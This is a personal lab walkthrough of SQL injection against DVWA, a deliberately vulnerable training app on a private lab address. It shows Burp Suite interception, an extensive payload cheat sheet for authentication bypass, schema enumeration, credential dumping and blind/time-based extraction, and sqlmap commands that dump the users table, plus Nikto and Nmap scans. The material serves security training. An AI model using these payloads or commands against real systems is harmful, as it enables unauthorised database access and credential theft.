# Test with DVWA 


## DVWA Testing SQL Injection

- First go to our target: http://192.168.127.129/dvwa/
Or we go direct to `SQL Injection`: http://192.168.127.129/dvwa/vulnerabilities/sqli/
<img width="1307" height="805" alt="image" src="https://github.com/user-attachments/assets/c986902a-3f65-4361-b34f-a2681b23ad20" />

<img width="1267" height="804" alt="image" src="https://github.com/user-attachments/assets/a385fb54-7fb5-462d-a8b7-905f290bd623" />

- And after i open my `Burp Suite` and also in this i connect `Burp` with my `Firefox`: 
<img width="1915" height="473" alt="image" src="https://github.com/user-attachments/assets/cea40d33-8266-41c7-9a27-9ebc925ba429" />

- I go back `Target` and right click on my target and after i hoose `add to scope`:
<img width="1917" height="577" alt="image" src="https://github.com/user-attachments/assets/1dfce83f-7e75-4294-9057-2a10d922d0ff" />

- And click `Yes`:
<img width="431" height="165" alt="image" src="https://github.com/user-attachments/assets/a6daa90c-b282-4e5a-91b5-daa869d613c5" />

<img width="1897" height="851" alt="image" src="https://github.com/user-attachments/assets/0a135aa9-293e-41bc-8eba-86d0d1b71831" />

- And after i see a lots target `URL` than befor, and after i go back to `Proxy`:
<img width="1916" height="693" alt="image" src="https://github.com/user-attachments/assets/50e42b14-a4f2-4ac5-9c95-9b93f673211e" />

<img width="1917" height="877" alt="image" src="https://github.com/user-attachments/assets/c4dc0dab-332c-467b-a540-59e896426ee4" />

- After i login i see:
<img width="1915" height="675" alt="image" src="https://github.com/user-attachments/assets/3cb87247-7f81-4874-9fb4-ea31c856f39c" />

<img width="935" height="704" alt="image" src="https://github.com/user-attachments/assets/a4b5bfeb-9c3e-4946-b2bd-5e9c77008e20" />

<img width="937" height="706" alt="image" src="https://github.com/user-attachments/assets/74a942ba-c13a-409b-9a52-05990fd28d12" />

<img width="1417" height="842" alt="image" src="https://github.com/user-attachments/assets/1d1a4273-6ae1-4e6e-9223-419eb192ab97" />

<img width="1912" height="507" alt="image" src="https://github.com/user-attachments/assets/d34d3339-5e48-45da-963f-d72d57252993" />

- In this i change:
<img width="1577" height="502" alt="image" src="https://github.com/user-attachments/assets/98c73beb-86bd-4277-96bd-ca40bef02895" />

- I see it have different. also if i input `2`: 
<img width="1586" height="782" alt="image" src="https://github.com/user-attachments/assets/073865e6-d7a1-4886-8d33-ee85d863e0ea" />

<img width="1576" height="826" alt="image" src="https://github.com/user-attachments/assets/1823114c-8181-4ff0-aca9-a769e76bc6ba" />

- Payload: `' OR 1=1 --`
<img width="1918" height="857" alt="image" src="https://github.com/user-attachments/assets/68cb94b7-80d4-47f8-9e2c-a4585cc4676e" />

<img width="980" height="770" alt="image" src="https://github.com/user-attachments/assets/97e61e88-b781-445d-abda-abab961c2362" />

- Oh in this when i click `send` but it has no what happen.


- Payload: `' OR 1=1 #`:
<img width="937" height="706" alt="image" src="https://github.com/user-attachments/assets/1dcbc66d-c09f-435b-bf0b-93ec775fbe87" />

<img width="939" height="651" alt="image" src="https://github.com/user-attachments/assets/f730c946-679b-402a-bec1-11340080d57f" />

- If i type this in our target it will work, but in burp maybe no what something happen.

- In `Burp Suite` if i go back to `Intercept` and i open those `intercept` and also in browser i type `1` and `submit` it will direct to `Burp`:
<img width="868" height="362" alt="image" src="https://github.com/user-attachments/assets/c5dd6968-14b7-494c-8d81-ad181a6b7feb" />

- Like this:
<img width="1919" height="644" alt="image" src="https://github.com/user-attachments/assets/2eb3a40a-3806-4bf0-80b3-3f088c6ec97b" />

- And i change it to `' OR 1=1 #` and i select on it and `Ctrl + u` to `encode` it: 
<img width="1049" height="646" alt="image" src="https://github.com/user-attachments/assets/00a07301-f9de-4a8f-9047-e5c404f46df8" />

<img width="1252" height="636" alt="image" src="https://github.com/user-attachments/assets/e8833ff8-3cda-4f58-8184-da7d45a13cac" />

- And after click `Forward` and it will show the `Injection`:
<img width="1917" height="585" alt="image" src="https://github.com/user-attachments/assets/dc3d560c-72cf-4339-adae-b8073ecb5339" />

- After i open my `Browser` and i see like this:
<img width="947" height="660" alt="image" src="https://github.com/user-attachments/assets/07a105de-0519-4ea6-adfa-d555940e010c" />


### One more Payload:
- Payload: `' UNION SELECT NULL, NULL # `
<img width="934" height="655" alt="image" src="https://github.com/user-attachments/assets/3cd556e4-2a2a-46e2-a05a-a14c22c0a8b6" />

- And after i select on it and `Ctrl + u` to encode it and i click on `Forward` also open our browser i see: 
<img width="939" height="661" alt="image" src="https://github.com/user-attachments/assets/ac42545b-5ae9-4afc-82b6-2ecebb699267" />

---



##  SQL Injection Payloads

### compact table
| Purpose                                          |                                                                                                                     Payload (example) | Notes / How to adapt                                                                                                                                          | Try in                 |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------: | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------- |
| **Auth bypass (tautology)**                      |                                                                                                                   `' OR '1'='1' -- -` | Classic login bypass; also try `OR 1=1#`. Works in string context.                                                                                            | Login form             |
| Auth bypass (numeric)                            |                                                                                                                           `0 OR 1=1#` | Use where numeric ID/parameter expected (no quotes).                                                                                                          | ID param               |
| Short username comment                           |                                                                                                                         `admin' -- -` | Use as username to comment out rest of query.                                                                                                                 | Login form             |
| Find column count (UNION probe)                  |                                                      `' UNION SELECT 1-- -`<br>`' UNION SELECT 1,2-- -`<br>`' UNION SELECT 1,2,3-- -` | Increase columns until query succeeds (or use `ORDER BY n`).                                                                                                  | Any injectable SELECT  |
| UNION with NULL placeholders                     |                                                                                              `' UNION SELECT NULL,NULL,@@version-- -` | Use `NULL` for columns you don't need; change number of NULLs to match columns.                                                                               | UNION-capable page     |
| Get DB version                                   |                                                                                                      `' UNION SELECT 1,@@version-- -` | If target returns two columns; adjust with NULLs.                                                                                                             | UNION-capable output   |
| Get current DB                                   |                                                                                                     `' UNION SELECT 1,database()-- -` | Returns current DB name.                                                                                                                                      | UNION-capable output   |
| List DBs (schemata)                              |                                                     `' UNION SELECT 1,group_concat(schema_name) FROM information_schema.schemata-- -` | `group_concat` combines rows into one string.                                                                                                                 | UNION-capable output   |
| List tables in current DB                        |                          `' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -` | Change `table_schema` to specific DB if needed.                                                                                                               | UNION-capable output   |
| List columns for `users` table                   | `' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users' AND table_schema=database()-- -` | Quote table name exactly.                                                                                                                                     | UNION-capable output   |
| Dump `users` (common DVWA)                       |                                                                                    `' UNION SELECT user,password FROM dvwa.users-- -` | If original query returns two columns and `dvwa` is DB name. Use `NULL` placeholders to match column count.                                                   | UNION-capable output   |
| Use `LIMIT` to page results                      |                                                                                    `' UNION SELECT id,name FROM users LIMIT 0,10-- -` | Useful when `group_concat` not available or to fetch rows directly.                                                                                           | UNION-capable output   |
| Boolean-based TRUE test                          |                                                                                                                      `' AND 1=1 -- -` | Should not change page if injectable; used to confirm.                                                                                                        | Any input              |
| Boolean-based FALSE test                         |                                                                                                                      `' AND 1=2 -- -` | Should alter page / return different result if injectable.                                                                                                    | Any input              |
| Boolean extract (example)                        |                                                                                   `' AND (SELECT SUBSTRING(database(),1,1))='a' -- -` | Use iteratively to infer characters of values.                                                                                                                | Blind/boolean contexts |
| Time-based delay (SLEEP)                         |                                                                                                        `' OR IF(1=1,SLEEP(5),0) -- -` | Causes ~5s delay if condition true. Useful where results suppressed.                                                                                          | Blind/time contexts    |
| Time-based extract (example)                     |                                                                        `' OR IF(ASCII(SUBSTRING(database(),1,1))>64,SLEEP(5),0) -- -` | Binary / range checks to extract characters via delays.                                                                                                       | Blind/time contexts    |
| Error-based leak (updatexml)                     |                                                                     `' AND updatexml(1,concat(0x7e,(select database()),0x7e),1) -- -` | Triggers an XML error containing query result if errors are shown. Depends on error messages being visible.                                                   | Error-displaying pages |
| Use `CHAR()` for tricky chars                    |                                                                                     `' UNION SELECT 1,concat(CHAR(100),CHAR(98))-- -` | Build strings by ASCII codes when quotes problematic.                                                                                                         | UNION-capable output   |
| LIKE wildcard probe                              |                                                                                                      `%' OR name LIKE '%admin%' -- -` | Useful when original query uses `LIKE`.                                                                                                                       | Search / filter inputs |
| ORDER BY column discovery                        |                                                                                               `' ORDER BY 1-- -` / `' ORDER BY 2-- -` | Increase index until query errors — finds number of selectable columns.                                                                                       | ORDER-capable queries  |
| Check for stacked queries (non-destructive test) |                                                                                      `'; SELECT BENCHMARK(1000000,MD5('test')); -- -` | **Do not run** destructive statements. BENCHMARK is non-destructive but may impact server. Use only in controlled lab. Many DB APIs disallow stacked queries. | Only in isolated lab   |
| Use `GROUP_CONCAT` to combine rows               |                                                                `' UNION SELECT 1,group_concat(username,0x3a,password) FROM users-- -` | `0x3a` is `:`, handy to separate fields.                                                                                                                      | UNION-capable output   |
| `INFORMATION_SCHEMA` quick search                |                         `' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_name LIKE '%user%'-- -` | Helpful to find likely tables.                                                                                                                                | UNION-capable output   |
| Escape/encode problem characters                 |                                                                                                   Use `CHAR()` or URL-encode payloads | If input filtering blocks quotes, build payloads from `CHAR()` or URL-encode.                                                                                 | Any input              |
| Use `IFNULL`/`COALESCE` to avoid NULL hides      |                                                                  `' UNION SELECT 1,IFNULL(group_concat(user), 'none') FROM users-- -` | Avoids NULL results hiding data.                                                                                                                              | UNION-capable output   |



## Here is common usage:

### Authentication Bypass
````
' OR '1'='1' -- 
' OR 1=1 -- 
admin' -- 
' OR 'a'='a
````
- Payload: 
<img width="899" height="579" alt="image" src="https://github.com/user-attachments/assets/922edef1-833e-498e-a901-8320bbf4cd46" />

<img width="429" height="448" alt="image" src="https://github.com/user-attachments/assets/2f3ea64b-1a24-4d08-a94b-6e10d094e25d" />

---

### Information Gathering
| Goal | Payload |
|------|--------|
| Confirm vulnerability | `' OR '1'='1` |
| Get DB version | `' UNION SELECT 1,@@version--+` |
| List databases | `' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--+` |
| Get current DB | `' UNION SELECT 1,DATABASE()--+` |
| List tables in current DB | `' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()--+` |
| List columns in users table | `' UNION SELECT 1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--+` |

- Payload: `' OR '1'='1`
<img width="416" height="434" alt="image" src="https://github.com/user-attachments/assets/d3197579-1907-4c11-9644-a3b02f1def03" />

---


### Data extraction
| Goal | Payload |
|------|--------|
| **Dump users table (DVWA)** | `' UNION SELECT user,password FROM users-- -` |
| **Dump all users with emails** | `' UNION SELECT CONCAT(user,':',email),password FROM users-- -` |
| **Dump admin credentials** | `' UNION SELECT user,password FROM users WHERE user='admin'-- -` |

- **Payload**: `' UNION SELECT user,password FROM users-- -`
<img width="592" height="437" alt="image" src="https://github.com/user-attachments/assets/e8bc2a22-0f69-4d1b-8f4f-c86c78dd0a34" />

---



## Tools for SQL Injection Exploitation

### 1. sqlmap – Automated SQL Injection Tool
- Check cookie:
<img width="937" height="662" alt="image" src="https://github.com/user-attachments/assets/825c431a-8be6-4f56-b861-d0b22cbe5619" />

<img width="1907" height="435" alt="image" src="https://github.com/user-attachments/assets/6ed6159b-0720-4e91-b74c-ea416eef912c" />

#### Basic Usage:
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=64a18e92a18ba786a311b699aa6a8d78" --batch
````
<img width="1915" height="809" alt="image" src="https://github.com/user-attachments/assets/f6012c10-1146-4a0e-bfc1-d86b52ffc88e" />

<img width="1918" height="658" alt="image" src="https://github.com/user-attachments/assets/258344b6-031e-4aaf-9eb5-67a2e144c10e" />

- All of them are payload that we can use for `sql injection` like:
- Payload: `1' OR NOT 5258=5258#&Submit=Submit`
<img width="903" height="740" alt="image" src="https://github.com/user-attachments/assets/dec55b78-d5ef-4773-9e2b-23281204550c" />

- Payload: `1' AND ROW(5886,1089)>(SELECT COUNT(*),CONCAT(0x717a767671,(SELECT (ELT(5886=5886,1))),0x716b627171,FLOOR(RAND(0)*2))x FROM (SELECT 9064 UNION SELECT 8354 UNION SELECT 2980 UNION SELECT 6227)a GROUP BY x)-- lZhy`
<img width="1638" height="159" alt="image" src="https://github.com/user-attachments/assets/748c6aa1-829a-456d-9955-ad0e19916a81" />

- Payload: `1' UNION ALL SELECT NULL,CONCAT(0x717a767671,0x43596c5967495a5a70535258655676466c5973596a77716153734e6b50494b5664656c4443454875,0x716b627171)#`
<img width="1215" height="385" alt="image" src="https://github.com/user-attachments/assets/c7241b17-351f-4c91-933a-ee0504d72403" />

---

#### Extract Database Info
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=64a18e92a18ba786a311b699aa6a8d78" --dbs
````
<img width="1911" height="792" alt="image" src="https://github.com/user-attachments/assets/0f3faf57-ba63-471e-9eb9-5b5e40b5da75" />

<img width="1193" height="412" alt="image" src="https://github.com/user-attachments/assets/8d95d02e-0fd4-4bef-acb5-1864ce010bae" />

####  Dump Tables from a Specific DB
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=64a18e92a18ba786a311b699aa6a8d78" -D dvwa --tables
````
<img width="1908" height="816" alt="image" src="https://github.com/user-attachments/assets/2c16ad04-3b3c-42c6-8ea6-eeeb6b507f21" />

<img width="1288" height="363" alt="image" src="https://github.com/user-attachments/assets/5a628d46-0d8f-4ec7-8e0b-38ee7647c5fd" />


#### Dump Data from **users** Table
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=64a18e92a18ba786a311b699aa6a8d78" -D dvwa -T users --dump
````
<img width="1907" height="768" alt="image" src="https://github.com/user-attachments/assets/3e15a0e5-10ee-4fb2-9be2-eaf09854c565" />

<img width="1092" height="809" alt="image" src="https://github.com/user-attachments/assets/b16a9ed8-4c36-4419-a681-9abe9710102d" />

<img width="1500" height="790" alt="image" src="https://github.com/user-attachments/assets/c73aef8c-91b2-4370-a721-db0d1e2720ba" />

- In this we found the correct `Username` and `Password` also all of this username and password we can login successfully.


---



### Nikto – Web Server Vulnerability Scanner
````
nikto -h http://192.168.127.129/dvwa/
````
<img width="1915" height="707" alt="image" src="https://github.com/user-attachments/assets/65c35ebb-ac47-4b1f-928d-0fe693a874b6" />

- Use this to identify misconfigurations or outdated software that may support SQLi.





### Nmap + NSE Scripts
````
nmap -p80 --script http-sql-injection 192.168.127.129
````
<img width="1228" height="818" alt="image" src="https://github.com/user-attachments/assets/0cae55ce-8ac7-41c7-a6ab-2c5e04f20072" />



----


## Finished DVWA

---
## Credit: Nin Kanong (k4n0ng)
### Date: 22/10/2025
---
